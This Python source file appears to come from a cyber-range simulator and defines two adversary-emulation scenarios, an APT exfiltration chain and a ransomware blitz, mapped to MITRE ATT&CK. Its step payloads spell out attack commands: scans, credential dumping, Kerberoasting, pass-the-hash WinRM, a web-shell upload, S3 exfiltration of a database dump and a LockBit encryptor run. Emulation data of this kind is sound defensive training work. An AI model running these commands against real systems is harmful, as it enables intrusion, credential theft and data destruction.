"""Pre-built adversary campaign scenarios mapped to MITRE ATT&CK enterprise tactics."""

from cyberlab.models.campaign import AttackScenario, AttackStep
from cyberlab.models.enums import KillChainPhase


def build_apt_data_exfiltration_scenario() -> AttackScenario:
    """Build the flagship 7-step APT Crown-Jewel Data Exfiltration Campaign.

    Kill Chain Flow:
    1. Recon: Port scan against DMZ Web Portal (T1595)
    2. Initial Access: Exploit FastCMS RCE on DMZ Web Server (T1190)
    3. Credential Access: Dump Service Account Memory on DMZ Web Server (T1003)
    4. Credential Access: Kerberoast Domain Controller from DMZ (T1558)
    5. Lateral Movement: Remote execution via WinRM onto Corp Workstation (T1021)
    6. Collection: Database Query & Archive on Enclave Database (T1560)
    7. Exfiltration: Data Exfiltration from Corp Workstation to Cloud S3 Storage (T1048)
    """
    steps = [
        AttackStep(
            step_id="step-01-recon-dmz",
            phase=KillChainPhase.RECONNAISSANCE,
            technique_id="T1595",
            technique_name="Active Scanning",
            source_host_id="host-attacker-01",
            target_host_id="host-dmz-web-01",
            target_port=443,
            command_payload="nmap -sS -p 80,443,22 10.0.1.10",
            stealth_level=0.3,
        ),
        AttackStep(
            step_id="step-02-exploit-web",
            phase=KillChainPhase.INITIAL_ACCESS,
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            source_host_id="host-attacker-01",
            target_host_id="host-dmz-web-01",
            target_port=443,
            command_payload="python3 exploit_cve_2024_38816.py --target https://10.0.1.10:443",
            preconditions=[],
            stealth_level=0.4,
        ),
        AttackStep(
            step_id="step-03-cred-dump",
            phase=KillChainPhase.CREDENTIAL_ACCESS,
            technique_id="T1003",
            technique_name="OS Credential Dumping",
            source_host_id="host-dmz-web-01",
            target_host_id="host-dmz-web-01",
            target_port=445,
            command_payload="procdump -ma /var/run/dmz-svc.pid creds.dmp",
            preconditions=["host-dmz-web-01"],
            stealth_level=0.5,
        ),
        AttackStep(
            step_id="step-04-kerberoast",
            phase=KillChainPhase.CREDENTIAL_ACCESS,
            technique_id="T1558",
            technique_name="Steal or Forge Kerberos Tickets",
            source_host_id="host-dmz-web-01",
            target_host_id="host-corp-dc-01",
            target_port=88,
            command_payload="GetUserSPNs.py corp.lab/dmz-svc -request -dc-ip 10.0.2.10",
            preconditions=["cred:domain-svc-token"],
            stealth_level=0.6,
        ),
        AttackStep(
            step_id="step-05-lateral-winrm",
            phase=KillChainPhase.LATERAL_MOVEMENT,
            technique_id="T1021",
            technique_name="Remote Services / Lateral Movement",
            source_host_id="host-dmz-web-01",
            target_host_id="host-corp-wkst-01",
            target_port=5985,
            command_payload="evil-winrm -i 10.0.2.101 -u Alice -H kerb_hash",
            preconditions=["cred:kerberos-tg-ticket"],
            stealth_level=0.7,
        ),
        AttackStep(
            step_id="step-06-collect-db",
            phase=KillChainPhase.COLLECTION,
            technique_id="T1560",
            technique_name="Archive Collected Data",
            source_host_id="host-corp-wkst-01",
            target_host_id="host-enclave-db-01",
            target_port=5432,
            command_payload=(
                "psql -h 10.0.3.50 -U dbadmin -d production -c 'COPY accounts TO STDOUT'"
            ),
            preconditions=["host-corp-wkst-01"],
            stealth_level=0.8,
        ),
        AttackStep(
            step_id="step-07-exfil-s3",
            phase=KillChainPhase.EXFILTRATION,
            technique_id="T1048",
            technique_name="Exfiltration Over Alternative Protocol",
            source_host_id="host-corp-wkst-01",
            target_host_id="host-cloud-storage-01",
            target_port=9000,
            command_payload="aws s3 cp /tmp/ledger.tar.gz s3://s3-lake.vpc.lab/dumps/",
            preconditions=["host-corp-wkst-01"],
            stealth_level=0.5,
        ),
    ]

    return AttackScenario(
        scenario_id="scenario-apt-exfiltration",
        name="APT Crown-Jewel Data Exfiltration",
        description=(
            "Multi-tier APT adversary campaign breaching DMZ, pivoting "
            "through AD, and exfiltrating Enclave DB records to Cloud VPC"
        ),
        threat_actor="APT29 / Nobelium Emulation",
        target_crown_jewel_id="host-enclave-db-01",
        steps=steps,
    )


def build_ransomware_blitz_scenario() -> AttackScenario:
    """Build a rapid destructive ransomware campaign attempting Enclave encryption."""
    steps = [
        AttackStep(
            step_id="step-01-ext-scan",
            phase=KillChainPhase.RECONNAISSANCE,
            technique_id="T1595",
            technique_name="Active Scanning",
            source_host_id="host-attacker-01",
            target_host_id="host-dmz-web-01",
            target_port=443,
            command_payload="masscan 10.0.1.0/24 -p443",
        ),
        AttackStep(
            step_id="step-02-web-exploit",
            phase=KillChainPhase.INITIAL_ACCESS,
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            source_host_id="host-attacker-01",
            target_host_id="host-dmz-web-01",
            target_port=443,
            command_payload="curl -X POST https://10.0.1.10/upload -F 'file=@shell.jsp'",
        ),
        AttackStep(
            step_id="step-03-direct-enclave-probe",
            phase=KillChainPhase.LATERAL_MOVEMENT,
            technique_id="T1021",
            technique_name="Remote Services / Lateral Movement",
            source_host_id="host-dmz-web-01",
            target_host_id="host-enclave-db-01",
            target_port=5432,
            command_payload="nc -zv 10.0.3.50 5432",
        ),
        AttackStep(
            step_id="step-04-ransomware-encrypt",
            phase=KillChainPhase.IMPACT,
            technique_id="T1486",
            technique_name="Data Encrypted for Impact",
            source_host_id="host-dmz-web-01",
            target_host_id="host-enclave-db-01",
            target_port=5432,
            command_payload="./lockbit_encryptor --target /var/lib/postgresql/data",
            preconditions=["host-enclave-db-01"],
        ),
    ]

    return AttackScenario(
        scenario_id="scenario-ransomware-blitz",
        name="Ransomware Blitzkrieg Campaign",
        description="Fast-moving ransomware seeking immediate database encryption from DMZ",
        threat_actor="LockBit 3.0 Emulation",
        target_crown_jewel_id="host-enclave-db-01",
        steps=steps,
    )


_BUILTIN_SCENARIOS = {
    "scenario-apt-exfiltration": build_apt_data_exfiltration_scenario,
    "scenario-ransomware-blitz": build_ransomware_blitz_scenario,
}


def list_builtin_scenarios() -> list[AttackScenario]:
    """Return instances of all pre-packaged adversary scenarios."""
    return [factory() for factory in _BUILTIN_SCENARIOS.values()]


def get_scenario_by_id(scenario_id: str) -> AttackScenario | None:
    """Look up a scenario by ID."""
    factory = _BUILTIN_SCENARIOS.get(scenario_id)
    return factory() if factory else None
